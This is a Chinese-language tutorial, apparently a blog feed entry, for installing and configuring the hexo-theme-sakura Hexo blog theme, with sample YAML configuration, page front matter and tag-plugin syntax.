<p>基于WordPress主题<a href="https://github.com/mashirozx/Sakura/">Sakura</a>修改成Hexo的主题。</p>
<p><a href="https://sakura.hojun.cn/">demo预览</a></p>
<p>正在开发中……</p>
<p><img src="https://wx3.sinaimg.cn/large/006bYVyvly1g069tuf42oj312w0m8ndq.jpg"></p>
<h2 id="交流群"><a href="#交流群" class="headerlink" title="交流群"></a>交流群</h2><p>若你是使用者，加群QQ: 801511924</p>
<p>若你是创作者，加群QQ: 194472590</p>
<h2 id="主题特性"><a href="#主题特性" class="headerlink" title="主题特性"></a>主题特性</h2><ul>
<li>首页大屏视频</li>
<li>首页随机封面</li>
<li>图片懒加载</li>
<li>valine评论</li>
<li>fancy-box相册</li>
<li>pjax支持，音乐不间断</li>
<li>aplayer音乐播放器</li>
<li>多级导航菜单（按现在大部分hexo主题来说，这也算是个特性了）</li>
</ul>
<h2 id="赞赏作者"><a href="#赞赏作者" class="headerlink" title="赞赏作者"></a>赞赏作者</h2><p>如果喜欢hexo-theme-sakura主题，可以考虑资助一下哦~非常感激！</p>
<p><a href="https://www.paypal.me/hojuncn">paypal</a> | <a href="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/custom/donate/AliPayQR.jpg">Alipay 支付宝</a> | <a href="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/custom/donate/WeChanSQ.jpg">WeChat Pay 微信支付</a></p>
<h2 id="未完善的使用教程"><a href="#未完善的使用教程" class="headerlink" title="未完善的使用教程"></a>未完善的使用教程</h2><p>那啥？老实说我目前也不是很有条理233333333~</p>
<h2 id="1、主题下载安装"><a href="#1、主题下载安装" class="headerlink" title="1、主题下载安装"></a>1、主题下载安装</h2><p><a href="https://github.com/honjun/hexo-theme-sakura">hexo-theme-sakura</a>建议下载压缩包格式，因为除了主题内容还有些source的配置对新手来说比较太麻烦，直接下载解压就省去这些麻烦咯。</p>
<p>下载好后解压到博客根目录（不是主题目录哦，重复的选择替换）。接着在命令行（cmd、bash）运行<code>npm i</code>安装依赖。</p>
<h2 id="2、主题配置"><a href="#2、主题配置" class="headerlink" title="2、主题配置"></a>2、主题配置</h2><h3 id="博客根目录下的-config配置"><a href="#博客根目录下的-config配置" class="headerlink" title="博客根目录下的_config配置"></a>博客根目录下的_config配置</h3><p>站点</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">你的站点名</span></span><br><span class="line"><span class="attr">subtitle:</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">站点简介</span></span><br><span class="line"><span class="attr">keywords:</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">作者名</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-cn</span></span><br><span class="line"><span class="attr">timezone:</span></span><br></pre></td></tr></table></figure>

<p>部署</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> </span><br><span class="line">    <span class="attr">github:</span> <span class="string">你的github仓库地址</span></span><br><span class="line">    <span class="comment"># coding: 你的coding仓库地址</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure>

<p>备份 （使用hexo b发布备份到远程仓库）</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">backup:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">message:</span> <span class="string">backup</span> <span class="string">my</span> <span class="string">blog</span> <span class="string">of</span> <span class="string">https://honjun.github.io/</span></span><br><span class="line">  <span class="attr">repository:</span></span><br><span class="line">    <span class="comment"># 你的github仓库地址,备份分支名  （建议新建backup分支）</span></span><br><span class="line">    <span class="attr">github:</span> <span class="string">https://github.com/honjun/honjun.github.io.git,backup</span></span><br><span class="line">    <span class="comment"># coding: https://git.coding.net/hojun/hojun.git,backup</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="主题目录下的-config配置"><a href="#主题目录下的-config配置" class="headerlink" title="主题目录下的_config配置"></a>主题目录下的_config配置</h3><p>其中标明【改】的是需要修改部门，标明【选】是可改可不改，标明【非】是不用改的部分</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># site name</span></span><br><span class="line"><span class="comment"># 站点名 【改】</span></span><br><span class="line"><span class="attr">prefixName:</span> <span class="string">さくら荘その</span></span><br><span class="line"><span class="attr">siteName:</span> <span class="string">hojun</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># favicon and site master avatar</span></span><br><span class="line"><span class="comment"># 站点的favicon和头像 输入图片路径（下面的配置是都是cdn的相对路径，没有cdn请填写完整路径，建议使用jsdeliver搭建一个cdn啦，先去下载我的cdn替换下图片就行了，简单方便~）【改】</span></span><br><span class="line"><span class="attr">favicon:</span> <span class="string">/images/favicon.ico</span></span><br><span class="line"><span class="attr">avatar:</span> <span class="string">/img/custom/avatar.jpg</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 站点url 【改】</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">https://sakura.hojun.cn</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 站点介绍（或者说是个人签名）【改】</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">Live</span> <span class="string">your</span> <span class="string">life</span> <span class="string">with</span> <span class="string">passion!</span> <span class="string">With</span> <span class="string">some</span> <span class="string">drive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 站点cdn，没有就为空 【改】  若是cdn为空，一些图片地址就要填完整地址了，比如之前avatar就要填https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/custom/avatar.jpg</span></span><br><span class="line"><span class="attr">cdn:</span> <span class="string">https://cdn.jsdelivr.net/gh/honjun/cdn@1.6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启pjax 【选】</span></span><br><span class="line"><span class="attr">pjax:</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 站点首页的公告信息 【改】</span></span><br><span class="line"><span class="attr">notice:</span> <span class="string">hexo-Sakura主题已经开源，目前正在开发中...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 懒加载的加载中图片 【选】</span></span><br><span class="line"><span class="attr">lazyloadImg:</span> <span class="string">https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 站点菜单配置 【选】</span></span><br><span class="line"><span class="attr">menus:</span></span><br><span class="line">  <span class="string">首页:</span> &#123; <span class="attr">path:</span> <span class="string">/</span>, <span class="attr">fa:</span> <span class="string">fa-fort-awesome</span> <span class="string">faa-shake</span> &#125;</span><br><span class="line">  <span class="string">归档:</span> &#123; <span class="attr">path:</span> <span class="string">/archives</span>, <span class="attr">fa:</span> <span class="string">fa-archive</span> <span class="string">faa-shake</span>, <span class="attr">submenus:</span> &#123; </span><br><span class="line">    <span class="string">技术:</span> &#123;<span class="attr">path:</span> <span class="string">/categories/技术/</span>, <span class="attr">fa:</span> <span class="string">fa-code</span> &#125;, </span><br><span class="line">    <span class="string">生活:</span> &#123;<span class="attr">path:</span> <span class="string">/categories/生活/</span>, <span class="attr">fa:</span> <span class="string">fa-file-text-o</span> &#125;, </span><br><span class="line">    <span class="string">资源:</span> &#123;<span class="attr">path:</span> <span class="string">/categories/资源/</span>, <span class="attr">fa:</span> <span class="string">fa-cloud-download</span> &#125;, </span><br><span class="line">    <span class="string">随想:</span> &#123;<span class="attr">path:</span> <span class="string">/categories/随想/</span>, <span class="attr">fa:</span> <span class="string">fa-commenting-o</span> &#125;,</span><br><span class="line">    <span class="string">转载:</span> &#123;<span class="attr">path:</span> <span class="string">/categories/转载/</span>, <span class="attr">fa:</span> <span class="string">fa-book</span> &#125;</span><br><span class="line">  &#125; &#125;</span><br><span class="line">  <span class="string">清单:</span> &#123; <span class="attr">path:</span> <span class="string">javascript:;</span>, <span class="attr">fa:</span> <span class="string">fa-list-ul</span> <span class="string">faa-vertical</span>, <span class="attr">submenus:</span> &#123; </span><br><span class="line">    <span class="string">书单:</span> &#123;<span class="attr">path:</span> <span class="string">/tags/悦读/</span>, <span class="attr">fa:</span> <span class="string">fa-th-list</span> <span class="string">faa-bounce</span> &#125;, </span><br><span class="line">    <span class="string">番组:</span> &#123;<span class="attr">path:</span> <span class="string">/bangumi/</span>, <span class="attr">fa:</span> <span class="string">fa-film</span> <span class="string">faa-vertical</span> &#125;, </span><br><span class="line">    <span class="string">歌单:</span> &#123;<span class="attr">path:</span> <span class="string">/music/</span>, <span class="attr">fa:</span> <span class="string">fa-headphones</span> &#125;,</span><br><span class="line">    <span class="string">图集:</span> &#123;<span class="attr">path:</span> <span class="string">/tags/图集/</span>, <span class="attr">fa:</span> <span class="string">fa-photo</span> &#125;</span><br><span class="line">  &#125; &#125;</span><br><span class="line">  <span class="string">留言板:</span> &#123; <span class="attr">path:</span> <span class="string">/comment/</span>, <span class="attr">fa:</span> <span class="string">fa-pencil-square-o</span> <span class="string">faa-tada</span> &#125;</span><br><span class="line">  <span class="string">友人帐:</span> &#123; <span class="attr">path:</span> <span class="string">/links/</span>, <span class="attr">fa:</span> <span class="string">fa-link</span> <span class="string">faa-shake</span> &#125;</span><br><span class="line">  <span class="string">赞赏:</span> &#123; <span class="attr">path:</span> <span class="string">/donate/</span>, <span class="attr">fa:</span> <span class="string">fa-heart</span> <span class="string">faa-pulse</span> &#125;</span><br><span class="line">  <span class="string">关于:</span> &#123; <span class="attr">path:</span> <span class="string">/</span>, <span class="attr">fa:</span> <span class="string">fa-leaf</span> <span class="string">faa-wrench</span> , <span class="attr">submenus:</span> &#123; </span><br><span class="line">    <span class="string">我？:</span> &#123;<span class="attr">path:</span> <span class="string">/about/</span>, <span class="attr">fa:</span> <span class="string">fa-meetup</span>&#125;, </span><br><span class="line">    <span class="string">主题:</span> &#123;<span class="attr">path:</span> <span class="string">/theme-sakura/</span>, <span class="attr">fa:</span> <span class="string">iconfont</span> <span class="string">icon-sakura</span> &#125;,</span><br><span class="line">    <span class="attr">Lab:</span> &#123;<span class="attr">path:</span> <span class="string">/lab/</span>, <span class="attr">fa:</span> <span class="string">fa-cogs</span> &#125;,</span><br><span class="line">  &#125; &#125;</span><br><span class="line">  <span class="string">客户端:</span> &#123; <span class="attr">path:</span> <span class="string">/client/</span>, <span class="attr">fa:</span> <span class="string">fa-android</span> <span class="string">faa-vertical</span> &#125;</span><br><span class="line">  <span class="attr">RSS:</span> &#123; <span class="attr">path:</span> <span class="string">/atom.xml</span>, <span class="attr">fa:</span> <span class="string">fa-rss</span> <span class="string">faa-pulse</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Home page sort type: -1: newer first，1: older first. 【非】</span></span><br><span class="line"><span class="attr">homePageSortType:</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Home page article shown number) 【非】</span></span><br><span class="line"><span class="attr">homeArticleShown:</span> <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 背景图片 【选】</span></span><br><span class="line"><span class="attr">bgn:</span> <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># startdash面板 url, title, desc img 【改】</span></span><br><span class="line"><span class="attr">startdash:</span> </span><br><span class="line">  <span class="bullet">-</span> &#123;<span class="attr">url:</span> <span class="string">/theme-sakura/</span>, <span class="attr">title:</span> <span class="string">Sakura</span>, <span class="attr">desc:</span> <span class="string">本站</span> <span class="string">hexo</span> <span class="string">主题</span>, <span class="attr">img:</span> <span class="string">/img/startdash/sakura.md.png</span>&#125;</span><br><span class="line">  <span class="bullet">-</span> &#123;<span class="attr">url:</span> <span class="string">http://space.bilibili.com/271849279</span>, <span class="attr">title:</span> <span class="string">Bilibili</span>, <span class="attr">desc:</span> <span class="string">博主的b站视频</span>, <span class="attr">img:</span> <span class="string">/img/startdash/bilibili.jpg</span>&#125;</span><br><span class="line">  <span class="bullet">-</span> &#123;<span class="attr">url:</span> <span class="string">/</span>, <span class="attr">title:</span> <span class="string">hojun的万事屋</span>, <span class="attr">desc:</span> <span class="string">技术服务</span>, <span class="attr">img:</span> <span class="string">/img/startdash/wangshiwu.jpg</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># your site build time or founded date</span></span><br><span class="line"><span class="comment"># 你的站点建立日期 【改】</span></span><br><span class="line"><span class="attr">siteBuildingTime:</span> <span class="number">07</span><span class="string">/17/2018</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 社交按钮(social)  url, img PC端配置 【改】</span></span><br><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="attr">github:</span> &#123;<span class="attr">url:</span> <span class="string">http://github.com/honjun</span>, <span class="attr">img:</span> <span class="string">/img/social/github.png</span>&#125;</span><br><span class="line">  <span class="attr">sina:</span> &#123;<span class="attr">url:</span> <span class="string">http://weibo.com/mashirozx?is_all=1</span>, <span class="attr">img:</span> <span class="string">/img/social/sina.png</span>&#125;</span><br><span class="line">  <span class="attr">wangyiyun:</span> &#123;<span class="attr">url:</span> <span class="string">http://weibo.com/mashirozx?is_all=1</span>, <span class="attr">img:</span> <span class="string">/img/social/wangyiyun.png</span>&#125;</span><br><span class="line">  <span class="attr">zhihu:</span> &#123;<span class="attr">url:</span> <span class="string">http://weibo.com/mashirozx?is_all=1</span>, <span class="attr">img:</span> <span class="string">/img/social/zhihu.png</span>&#125;</span><br><span class="line">  <span class="attr">email:</span> &#123;<span class="attr">url:</span> <span class="string">http://weibo.com/mashirozx?is_all=1</span>, <span class="attr">img:</span> <span class="string">/img/social/email.svg</span>&#125;</span><br><span class="line">  <span class="attr">wechat:</span> &#123;<span class="attr">url:</span> <span class="string">/#</span>, <span class="attr">qrcode:</span> <span class="string">/img/custom/wechat.jpg</span>, <span class="attr">img:</span> <span class="string">/img/social/wechat.png</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 社交按钮(msocial)  url, img 移动端配置 【改】</span></span><br><span class="line"><span class="attr">msocial:</span></span><br><span class="line">  <span class="attr">github:</span> &#123;<span class="attr">url:</span> <span class="string">http://github.com/honjun</span>, <span class="attr">fa:</span> <span class="string">fa-github</span>, <span class="attr">color:</span> <span class="number">333</span>&#125;</span><br><span class="line">  <span class="attr">weibo:</span> &#123;<span class="attr">url:</span> <span class="string">http://weibo.com/mashirozx?is_all=1</span>, <span class="attr">fa:</span> <span class="string">fa-weibo</span>, <span class="attr">color:</span> <span class="string">dd4b39</span>&#125;</span><br><span class="line">  <span class="attr">qq:</span> &#123;<span class="attr">url:</span> <span class="string">https://wpa.qq.com/msgrd?v=3&amp;uin=954655431&amp;site=qq&amp;menu=yes</span>, <span class="attr">fa:</span> <span class="string">fa-qq</span>, <span class="attr">color:</span> <span class="string">25c6fe</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 赞赏二维码（其中wechatSQ是赞赏单页面的赞赏码图片）【改】</span></span><br><span class="line"><span class="attr">donate:</span></span><br><span class="line">  <span class="attr">alipay:</span> <span class="string">/img/custom/donate/AliPayQR.jpg</span></span><br><span class="line">  <span class="attr">wechat:</span> <span class="string">/img/custom/donate/WeChanQR.jpg</span></span><br><span class="line">  <span class="attr">wechatSQ:</span> <span class="string">/img/custom/donate/WeChanSQ.jpg</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 首页视频地址为https://cdn.jsdelivr.net/gh/honjun/hojun@1.2/Unbroken.mp4，配置如下 【改】</span></span><br><span class="line"><span class="attr">movies:</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">https://cdn.jsdelivr.net/gh/honjun/hojun@1.2</span></span><br><span class="line">  <span class="comment"># 多个视频用逗号隔开，随机获取。支持的格式目前已知MP4,Flv。其他的可以试下，不保证有用</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">Unbroken.mp4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 左下角aplayer播放器配置 主要改id和server这两项，修改详见[aplayer文档] 【改】</span></span><br><span class="line"><span class="attr">aplayer:</span> </span><br><span class="line">  <span class="attr">id:</span> <span class="number">2660651585</span></span><br><span class="line">  <span class="attr">server:</span> <span class="string">netease</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">playlist</span></span><br><span class="line">  <span class="attr">fixed:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">mini:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">autoplay:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">loop:</span> <span class="string">all</span></span><br><span class="line">  <span class="attr">order:</span> <span class="string">random</span></span><br><span class="line">  <span class="attr">preload:</span> <span class="string">auto</span></span><br><span class="line">  <span class="attr">volume:</span> <span class="number">0.7</span></span><br><span class="line">  <span class="attr">mutex:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Valine评论配置【改】</span></span><br><span class="line"><span class="attr">valine:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">v_appId:</span> <span class="string">GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz</span></span><br><span class="line"><span class="attr">v_appKey:</span> <span class="string">mgOpfzbkHYqU92CV4IDlAUHQ</span></span><br></pre></td></tr></table></figure>

<h2 id="分类页和标签页配置"><a href="#分类页和标签页配置" class="headerlink" title="分类页和标签页配置"></a>分类页和标签页配置</h2><h3 id="分类页"><a href="#分类页" class="headerlink" title="分类页"></a>分类页</h3><p><img src="https://ws3.sinaimg.cn/large/006bYVyvly1g07b0gucy9j31060jih76.jpg"></p>
<h3 id="标签页"><a href="#标签页" class="headerlink" title="标签页"></a>标签页</h3><p><img src="https://wx2.sinaimg.cn/large/006bYVyvly1g07azb2399j31040jgazs.jpg"></p>
<p>配置项在\themes\Sakura\languages\zh-cn.yml里。新增一个分类或标签最好加下哦，当然嫌麻烦可以直接使用一张默认图片（可以改主题或者直接把404图片替换下，征求下意见要不要给这个在配置文件中加个开关，可以issue或群里提出来），现在是没设置的话会使用那种倒立小狗404哦。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#category</span></span><br><span class="line"><span class="comment"># 按分类名创建</span></span><br><span class="line"><span class="string">技术:</span></span><br><span class="line">    <span class="comment">#中文标题</span></span><br><span class="line">    <span class="attr">zh:</span> <span class="string">野生技术协会</span> </span><br><span class="line">    <span class="comment"># 英文标题</span></span><br><span class="line">    <span class="attr">en:</span> <span class="string">Geek</span> <span class="string">–</span> <span class="string">Only</span> <span class="string">for</span> <span class="string">Love</span></span><br><span class="line">    <span class="comment"># 封面图片</span></span><br><span class="line">    <span class="attr">img:</span> <span class="string">https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/banner/coding.jpg</span></span><br><span class="line"><span class="string">生活:</span></span><br><span class="line">    <span class="attr">zh:</span> <span class="string">生活</span></span><br><span class="line">    <span class="attr">en:</span> <span class="string">live</span></span><br><span class="line">    <span class="attr">img:</span> <span class="string">https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/banner/writing.jpg</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#tag</span></span><br><span class="line"><span class="comment"># 标签名即是标题</span></span><br><span class="line"><span class="string">悦读:</span></span><br><span class="line">    <span class="comment"># 封面图片</span></span><br><span class="line">    <span class="attr">img:</span> <span class="string">https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/banner/reading.jpg</span></span><br></pre></td></tr></table></figure>

<h2 id="单页面封面配置"><a href="#单页面封面配置" class="headerlink" title="单页面封面配置"></a>单页面封面配置</h2><p><img src="https://ws3.sinaimg.cn/large/006bYVyvly1g07b1pi619j31080jge4u.jpg"><br>如留言板页面页面，位于source下的comment下，打开index.md如下：</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: comment</span><br><span class="line">date: 2018-12-20 23:13:48</span><br><span class="line">keywords: 留言板</span><br><span class="line">description: </span><br><span class="line">comments: true</span><br><span class="line"><span class="section"># 在这里配置单页面头部图片，自定义替换哦~</span></span><br><span class="line"><span class="section">photos: https://cdn.jsdelivr.net/gh/honjun/cdn@1.4/img/banner/comment.jpg</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure>


<h2 id="单页面配置"><a href="#单页面配置" class="headerlink" title="单页面配置"></a>单页面配置</h2><h3 id="番组计划页-（请直接在下载后的文件中改，下面的添加了注释可能会有些影响）"><a href="#番组计划页-（请直接在下载后的文件中改，下面的添加了注释可能会有些影响）" class="headerlink" title="番组计划页 （请直接在下载后的文件中改，下面的添加了注释可能会有些影响）"></a>番组计划页 （请直接在下载后的文件中改，下面的添加了注释可能会有些影响）</h3><p><img src="https://wx2.sinaimg.cn/large/006bYVyvly1g07b2gyx60j31090jjahj.jpg"></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">layout:</span> <span class="string">bangumi</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">bangumi</span></span><br><span class="line"><span class="attr">comments:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019-02-10 21:32:48</span></span><br><span class="line"><span class="attr">keywords:</span></span><br><span class="line"><span class="attr">description:</span></span><br><span class="line"><span class="attr">bangumis:</span></span><br><span class="line">  <span class="comment"># 番组图片</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">img:</span> <span class="string">https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg</span></span><br><span class="line">  <span class="comment"># 番组名</span></span><br><span class="line">    <span class="attr">title:</span> <span class="string">朝花夕誓——于离别之朝束起约定之花</span></span><br><span class="line">  <span class="comment"># 追番状态 （追番ing/已追完）</span></span><br><span class="line">    <span class="attr">status:</span> <span class="string">已追完</span></span><br><span class="line">  <span class="comment"># 追番进度</span></span><br><span class="line">    <span class="attr">progress:</span> <span class="number">100</span></span><br><span class="line">  <span class="comment"># 番剧日文名称</span></span><br><span class="line">    <span class="attr">jp:</span> <span class="string">さよならの朝に約束の花をかざろう</span></span><br><span class="line">  <span class="comment"># 放送时间</span></span><br><span class="line">    <span class="attr">time:</span> <span class="string">放送时间:</span> <span class="number">2018-02-24 </span><span class="string">SUN.</span></span><br><span class="line">  <span class="comment"># 番剧介绍</span></span><br><span class="line">    <span class="attr">desc:</span>  <span class="string">住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">img:</span> <span class="string">https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg</span></span><br><span class="line">    <span class="attr">title:</span> <span class="string">朝花夕誓——于离别之朝束起约定之花</span></span><br><span class="line">    <span class="attr">status:</span> <span class="string">已追完</span></span><br><span class="line">    <span class="attr">progress:</span> <span class="number">50</span></span><br><span class="line">    <span class="attr">jp:</span> <span class="string">さよならの朝に約束の花をかざろう</span></span><br><span class="line">    <span class="attr">time:</span> <span class="string">放送时间:</span> <span class="number">2018-02-24 </span><span class="string">SUN.</span></span><br><span class="line">    <span class="attr">desc:</span> <span class="string">住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>

<h3 id="友链页-（请直接在下载后的文件中改，下面的添加了注释可能会有些影响）"><a href="#友链页-（请直接在下载后的文件中改，下面的添加了注释可能会有些影响）" class="headerlink" title="友链页 （请直接在下载后的文件中改，下面的添加了注释可能会有些影响）"></a>友链页 （请直接在下载后的文件中改，下面的添加了注释可能会有些影响）</h3><p><img src="https://ws3.sinaimg.cn/large/006bYVyvly1g07b39tleej31080jhjv1.jpg"></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">layout:</span> <span class="string">links</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">links</span></span><br><span class="line"><span class="comment"># 创建日期，可以改下</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2018-12-19 23:11:06</span> </span><br><span class="line"><span class="comment"># 图片上的标题，自定义修改</span></span><br><span class="line"><span class="attr">keywords:</span> <span class="string">友人帐</span> </span><br><span class="line"><span class="attr">description:</span> </span><br><span class="line"><span class="comment"># true/false 开启/关闭评论</span></span><br><span class="line"><span class="attr">comments:</span> <span class="literal">true</span> </span><br><span class="line"><span class="comment"># 页面头部图片，自定义修改</span></span><br><span class="line"><span class="attr">photos:</span> <span class="string">https://cdn.jsdelivr.net/gh/honjun/cdn@1.4/img/banner/links.jpg</span> </span><br><span class="line"><span class="comment"># 友链配置</span></span><br><span class="line"><span class="attr">links:</span> </span><br><span class="line">  <span class="comment"># 类型分组</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">group:</span> <span class="string">个人项目</span></span><br><span class="line">    <span class="comment"># 类型简介</span></span><br><span class="line">    <span class="attr">desc:</span> <span class="string">充分说明这家伙是条咸鱼</span> <span class="string">&lt;</span> <span class="string">(￣︶￣)&gt;</span></span><br><span class="line">    <span class="attr">items:</span></span><br><span class="line">    <span class="comment"># 友链链接</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">url:</span> <span class="string">https://shino.cc/fgvf</span></span><br><span class="line">    <span class="comment"># 友链头像</span></span><br><span class="line">      <span class="attr">img:</span> <span class="string">https://cloud.moezx.cc/Picture/svg/landscape/fields.svg</span></span><br><span class="line">    <span class="comment"># 友链站点名</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">Google</span></span><br><span class="line">    <span class="comment"># 友链介绍  下面雷同</span></span><br><span class="line">      <span class="attr">desc:</span> <span class="string">Google</span> <span class="string">镜像</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">url:</span> <span class="string">https://shino.cc/fgvf</span></span><br><span class="line">      <span class="attr">img:</span> <span class="string">https://cloud.moezx.cc/Picture/svg/landscape/fields.svg</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">Google</span></span><br><span class="line">      <span class="attr">desc:</span> <span class="string">Google</span> <span class="string">镜像</span></span><br><span class="line">  <span class="comment"># 类型分组...</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">group:</span> <span class="string">小伙伴们</span></span><br><span class="line">    <span class="attr">desc:</span> <span class="string">欢迎交换友链</span> <span class="string">ꉂ(ˊᗜˋ)</span></span><br><span class="line">    <span class="attr">items:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">url:</span> <span class="string">https://shino.cc/fgvf</span></span><br><span class="line">      <span class="attr">img:</span> <span class="string">https://cloud.moezx.cc/Picture/svg/landscape/fields.svg</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">Google</span></span><br><span class="line">      <span class="attr">desc:</span> <span class="string">Google</span> <span class="string">镜像</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">url:</span> <span class="string">https://shino.cc/fgvf</span></span><br><span class="line">      <span class="attr">img:</span> <span class="string">https://cloud.moezx.cc/Picture/svg/landscape/fields.svg</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">Google</span></span><br><span class="line">      <span class="attr">desc:</span> <span class="string">Google</span> <span class="string">镜像</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>

<h2 id="写文章配置"><a href="#写文章配置" class="headerlink" title="写文章配置"></a>写文章配置</h2><p>主题集成了个人插件hexo-tag-bili和hexo-tag-fancybox_img。其中hexo-tag-bili用来在文章或单页面中插入B站外链视频，使用语法如下：</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">&#123;% bili video<span class="emphasis">_id [page] %&#125;</span></span><br></pre></td></tr></table></figure>
<p>详细使用教程详见<a href="https://github.com/honjun/hexo-tag-bili/blob/master/README-zh_cn.md">hexo-tag-bili</a>。</p>
<p>hexo-tag-fancybox_img用来在文章或单页面中图片，使用语法如下：</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">&#123;% fb<span class="emphasis">_img src [caption] %&#125;</span></span><br></pre></td></tr></table></figure>
<p>详细使用教程详见<a href="https://github.com/honjun/hexo-tag-fancybox_img/blob/master/README-zh_cn.md">hexo-tag-fancybox_img</a></p>
<h2 id="还有啥，一时想不起来……"><a href="#还有啥，一时想不起来……" class="headerlink" title="还有啥，一时想不起来……"></a>还有啥，一时想不起来……</h2><p>To be continued…</p>
]]></content>
      <categories>
        <category>杂事</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>悦读</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL</title>
